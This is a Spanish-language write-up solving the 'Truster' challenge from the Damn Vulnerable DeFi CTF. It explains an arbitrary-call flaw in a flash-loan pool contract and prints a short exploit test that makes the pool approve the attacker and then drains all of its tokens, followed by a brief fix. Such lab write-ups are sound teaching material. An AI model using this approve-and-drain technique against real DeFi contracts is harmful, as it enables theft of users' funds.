---
title: Solucion al challenge .#3 Truster
date: 2022-01-4
excerpt: Cada dia mas lendings pools ofrecen flash loans. En este caso se ha lanzado un pool que ofrece flash loans de tokens DVT gratis. Actualmente el pool tiene un millon de tokens DVT. Tu no tienes nada. Pero no te preocupes, quizas puedas tener todo el balance del pool... en una sola transaccion
---

Cada dia mas lendings pools ofrecen flash loans. En este caso se ha lanzado un pool que ofrece flash loans de tokens DVT gratis.

Actualmente el pool tiene un millon de tokens DVT. Tu no tienes nada :(

Pero no te preocupes, quizas puedas tener todo el balance del pool... en una sola transaccion


## Como funciona?

El contrato [TrusterLenderPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/truster/TrusterLenderPool.sol) tiene una 
funcion `flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data)` que se utiliza para realizar el flash loan, `borrowAmount` es cuanto pedis prestado
`borrower` es quien recibe el prestamo, `target` es el contrato y en `data` se pasa la funcion y los argumentos para que se ejecute en target.

Fragmento de TrusterLenderPool.sol
```js
    using Address for address;

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

`functionCall` es una librerira provista por OpenZeppelin, se declara en `using Address for address;`, luego se utiliza en `target.functionCall(data);`.

El problema radica en que se hace una llamada externa a un contrato que puede ser malicioso y con una ejecucion de funciones y parametros arbitrarios.

Esto no es la primera vez que pasa, este fue un [caso real en zapper](https://medium.com/immunefi/zapper-arbitrary-call-data-bug-fix-postmortem-d75a4a076ae9)


## El exploit

Bastante simple, solo hay que hacer que el contrato apruebe al atacante para hacer uso de sus tokens.

```js
    it('Exploit', async function () {
        const encodedData = this.token.interface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL])  
        await this.pool.connect(attacker).flashLoan(0, this.pool.address, this.token.address, encodedData);
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });
```

Con esto hacemos que el contrato haga una llamada a `token.approve(atacante, cantidadDeToknes);`, una vez que podemos hacer uso de los tokes del contrato los trasnferimos a nuestra cuenta y drop the mic.


## Como solucionarlo?

Bastaria con evitar que el usuario haga una llamada arbitraria.

